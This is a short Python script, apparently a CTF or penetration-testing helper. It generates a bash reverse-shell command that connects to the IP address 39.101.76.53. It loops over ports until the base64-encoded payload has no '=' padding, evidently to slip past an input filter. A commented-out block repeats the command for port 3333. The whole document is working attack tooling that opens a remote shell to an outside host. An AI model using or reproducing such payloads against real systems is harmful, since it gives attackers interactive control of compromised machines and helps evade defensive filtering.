import base64

for i in range(40000,70000):
    print(i)
    cmd=f'bash -c "bash -i >& /dev/tcp/39.101.76.53/{i} 0>&1"'
    cmd = base64.b64encode(cmd.encode()).decode()
    print(cmd)
    if '=' not in cmd:
        break

# cmd='bash -c "bash -i >& /dev/tcp/39.101.76.53/3333 0>&1"'
# cmd = base64.b64encode(cmd.encode()).decode()
# print(cmd)